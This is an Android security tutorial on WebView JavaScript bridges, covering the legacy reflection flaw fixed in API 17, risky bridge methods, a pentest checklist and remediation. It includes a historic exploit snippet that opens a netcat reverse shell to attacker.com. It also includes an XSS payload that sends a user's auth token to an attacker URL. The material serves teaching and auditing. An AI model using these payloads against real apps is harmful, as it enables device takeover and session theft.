# JavaScript Bridges & Native APIs

**Standard Alignment:** [OWASP MASVS-PLATFORM](https://mas.owasp.org/MASVS/), [OWASP MASTG-TEST-0026](https://mas.owasp.org/MASVS/)  
**Core Model:** JavaScript Interface (`addJavascriptInterface`) → `@JavascriptInterface` Annotation → Weaponizing Web XSS into Native App Compromise

---

## 1. Bridging the Web and Native Worlds

Mobile applications frequently require bidirectional communication between embedded web pages and native Android framework APIs. Android provides the **JavaScript Interface** mechanism via `WebView.addJavascriptInterface()`:

```
+──────────────────────────+                        +──────────────────────────+
|  Embedded Web Page       |                        |   Android Host App       |
|  (JavaScript in WebView) |                        |   (Native Kotlin/Java)   |
|                          |                        |                          |
|  window.AndroidBridge.   |  Invokes Exposed Method|  class WebBridge {       |
|    getUserToken()        |───────────────────────►|    @JavascriptInterface  |
|                          |                        |    fun getUserToken():...|
|                          |  Returns Secret Token  |  }                       |
|                          |◄───────────────────────|                          |
+──────────────────────────+                        +──────────────────────────+
```

```kotlin
// Attaching a native bridge to a WebView
class WebBridge(private val context: Context) {
    @JavascriptInterface
    fun getUserAuthToken(): String {
        return SessionManager.getAuthToken(context)
    }

    @JavascriptInterface
    fun downloadPdfReport(url: String, filename: String) {
        DownloadHelper.downloadFile(url, filename)
    }
}

webView.settings.javaScriptEnabled = true
webView.addJavascriptInterface(WebBridge(this), "AndroidBridge")
```

Inside the web page's JavaScript:
```javascript
// Web code directly invokes native method
const token = window.AndroidBridge.getUserAuthToken();
console.log("Retrieved native token:", token);
```

---

## 2. The Legacy Remote Code Execution (RCE) Flaw

Prior to Android 4.2 (API 17), `addJavascriptInterface` suffered from a catastrophic design vulnerability (CVE-2012-6636):
- In early Dalvik runtimes, JavaScript could access all public methods inherited from `java.lang.Object`, including `getClass()`.
- An attacker with JavaScript execution inside the WebView could use Java reflection to instantiate `java.lang.Runtime` and execute arbitrary Linux shell commands on the phone:
  ```javascript
  // Historic RCE exploit targeting pre-API 17 WebViews
  for (var obj in window) {
      if ("getClass" in window[obj]) {
          window[obj].getClass().forName("java.lang.Runtime")
              .getMethod("getRuntime", null).invoke(null, null)
              .exec(["/system/bin/sh", "-c", "nc attacker.com 4444 -e /system/bin/sh"]);
          break;
      }
  }
  ```

### 2.1. The API 17 Fix: Mandatory `@JavascriptInterface`
Starting with Android 4.2 (API 17):
- The platform enforces that **only methods explicitly annotated with `@JavascriptInterface` are exposed to the JavaScript context**.
- Unannotated methods (and methods inherited from `Object`) are invisible to JavaScript.

---

## 3. Modern Bridge Vulnerabilities: The Logical Privilege Escalation

While the `@JavascriptInterface` annotation eliminated generic reflection-based RCE, **modern applications are routinely compromised through dangerous logical bridge methods**:

```
+─────────────────────────────────────────────────────────────+
|               High-Risk Native Bridge Anti-Patterns         |
|                                                             |
|  1. Exposing Authentication Credentials:                    |
|     - getToken(), getApiKey(), getPrivateKey()              |
|                                                             |
|  2. Exposing Unconstrained File Operations:                 |
|     - saveFile(filename, content), readFile(path)           |
|                                                             |
|  3. Exposing Telephony or Financial Transactions:           |
|     - sendSms(destination, body), initiateTransfer(amount)  |
|                                                             |
|  4. Exposing Intent Launchers:                              |
|     - launchActivity(intentUri) (Intent Redirection!)       |
+─────────────────────────────────────────────────────────────+
```

### 3.1. Weaponizing Web XSS into Native Compromise
The primary danger of a native bridge is that **any Cross-Site Scripting (XSS) vulnerability on the loaded web page translates into an immediate native device compromise**:

```
[The Attack Chain]
1. Target app loads https://trusted.example/help in a WebView with AndroidBridge attached.
2. trusted.example contains a standard DOM XSS or reflected XSS flaw in a search box.
3. Attacker injects a script into the page:
   <script>
     var token = window.AndroidBridge.getUserAuthToken();
     new Image().src = "https://attacker.com/steal?token=" + encodeURIComponent(token);
   </script>
4. The injected script executes inside the WebView, calls the native bridge, and exfiltrates
   the user's high-privilege mobile session token directly to the attacker!
```

---

## 4. Pentester's Operational Checklist: Auditing Bridges

1. **Search for Bridge Attachment in JADX:**
   Search for all occurrences of `.addJavascriptInterface(`.
2. **Audit Annotated Methods:**
   Inspect the bridge class and identify all methods annotated with `@JavascriptInterface`.
3. **Trace Method Sinks:**
   - Does any method return private tokens, passwords, or PII?
   - Does any method accept file paths without path-traversal sanitization?
   - Does any method invoke `startActivity()` or `sendBroadcast()` with caller-supplied arguments?
4. **Inspect WebView Navigation Controls:**
   Verify whether the WebView allows navigating to arbitrary third-party websites while the bridge is attached.

---

## 5. Defense & Remediation Standards

1. **Minimize Bridge Interfaces:** Avoid exposing native bridges unless strictly necessary. For simple message passing, use standard web-to-native deep links or postMessage schemes.
2. **Never Return Long-Lived Tokens Across Bridges:** Bridge methods must never return master API keys or long-lived authentication tokens to JavaScript.
3. **Enforce Origin Restrictions:** Never attach native bridges to WebViews that load external or untrusted third-party websites. Restrict bridge usage strictly to verified internal origins.
